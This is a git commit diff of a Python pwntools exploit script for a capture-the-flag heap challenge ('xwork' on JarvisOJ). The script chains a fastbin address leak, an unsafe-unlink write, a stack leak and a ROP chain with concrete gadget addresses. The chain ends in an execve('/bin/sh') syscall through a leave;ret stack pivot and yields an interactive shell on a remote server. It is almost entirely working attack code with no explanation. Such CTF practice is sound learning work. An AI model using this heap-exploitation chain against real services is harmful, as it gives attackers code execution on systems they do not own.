e628e66afd97885938a14462c8b1825801487eb3
bash-c <aboultraman@gmail.com>
2018-09-19 19:47:08 +0800

    fastbin leak -> unsafe unlink -> stack-pivot -> rop

--- jarvisOJ_xwork/exp.py
+++ jarvisOJ_xwork/exp.py
@@ -1,9 +1,9 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
 
 from pwn import *
 from time import sleep
+import roputils as rp
 import os
 import sys
 
@@ -13,30 +13,31 @@ remoteAddr = "pwn2.jarvisoj.com"
 remotePort = 9897
 
 context.binary = elfPath
-context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
-
 elf = context.binary
 if sys.argv[1] == "l":
-    context.log_level = "debug"
-    # env = {'LD_PRELOAD': ''}
-    # io = process("", env = env)
     io = process(elfPath)
     libc = elf.libc
 
 else:
-    context.log_level = "info"
-    io = remote(remoteAddr, remotePort)
+    if sys.argv[1] == "d":
+        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
+    else:
+        io = remote(remoteAddr, remotePort)
+        context.log_level = "info"
     if libcPath:
         libc = ELF(libcPath)
 
+context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
 
 def DEBUG(bps = [], pie = False):
+    cmd = "set follow-fork-mode parent\n"
     if pie:
-        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
-        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
+        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
+        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
     else:
-        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])
+        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])
 
     if bps != []:
         cmd += "c"
@@ -44,40 +45,73 @@ def DEBUG(bps = [], pie = False):
     raw_input("DEBUG: ")
     gdb.attach(io, cmd)
 
-def init():
-    io.sendafter(":", "m4x")
-
-def add(payload):
-    io.sendafter("Exit\n", "1")
-    io.send(payload)
+def add(cont):
+    assert len(cont) < 32
+    io.sendlineafter("Exit\n", "1")
+    io.send(cont)
 
 def show(idx):
-    io.sendafter("Exit\n", "2")
-    io.sendafter(":", str(idx))
+    assert 0 <= idx <= 10
+    io.sendlineafter("Exit\n", "2")
+    io.sendlineafter("index:", str(idx))
 
-def edit(idx, payload):
-    io.sendafter("Exit\n", "3")
-    io.sendafter(":", str(idx))
-    io.send(payload)
+def edit(idx, cont):
+    assert 0 <= idx <= 10
+    assert len(cont) < 32
+    io.sendlineafter("Exit\n", "3")
+    io.sendlineafter("index:", str(idx))
+    io.send(cont)
 
 def delete(idx):
-    io.sendafter("Exit\n", "4")
-    io.sendafter(":", str(idx))
+    assert 0 <= idx <= 10
+    io.sendlineafter("Exit\n", "4")
+    io.sendlineafter("index:", str(idx))
 
 if __name__ == "__main__":
-    init()
-    add('0000')
-    add('1111')
-    delete(0)
-    delete(1)
-    show(0)
-    show(1)
-    heapBase = u64(io.recvn(8))
-    success("heapBase", heapBase)
-    pause()
+    io.sendlineafter("name:", "/bin/sh\0")
+    chunk_list = 0x6CCD60
 
-    #  DEBUG([0x400CCD])
-    delete(0)
+    add(flat(0, 0x51, chunk_list - 0x18, chunk_list - 0x10)[: -1]) 
+    add(flat('1' * 16, 0, 0x31)[: -1]) 
+    add('2' * 31) 
+    add('3' * 31) 
+    add('4' * 31) 
+    delete(1)
+    delete(2)
+    show(2)
+    chunk1addr = u32(io.recvn(4))
+    success("chunk1addr", chunk1addr)
+
+    # unlink
+    edit(2, p64(chunk1addr + 0x20))
+    add('5' * 31)
+    add(flat(0x50, 0x90))
+    delete(2)
+
+    edit(0, flat(0, 0x6CBB80, 0, chunk_list + 0x8)[: -1])
+    # leak stack
+    edit(0, p64(0x6cc640))
+    show(1)
+    stack = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 0x188
+    success("stack", stack)
     
+
+    rop_addr = 0x6CBB60 + 0x700
+    # 0x00000000004789a6 : pop rax ; pop rdx ; pop rbx ; ret
+    edit(0, p64(rop_addr))
+    edit(1, flat(0x4789a6, 59, 0, 0)[: -1])
+    # 0x00000000004019c7 : pop rsi ; ret
+    # 0x00000000004018a6 : pop rdi ; ret
+    edit(0, p64(rop_addr + 0x20))
+    edit(1, flat(0x4019c7, 0, 0x4018a6, 0x6CCDC0)[: -1])
+
+    # 0x000000000043f365 : syscall ; ret
+    edit(0, p64(rop_addr + 0x40))
+    edit(1, p64(0x43f365))
+
+    #  DEBUG([0x400BF0, 0x400B00, 0x400C65, 0x400CCD])
+    # 0x0000000000400a12 : leave ; ret
+    edit(0, p64(stack + 0x10))
+    edit(1, flat(rop_addr - 8, 0x400a12))
+
     io.interactive()
-    io.close()
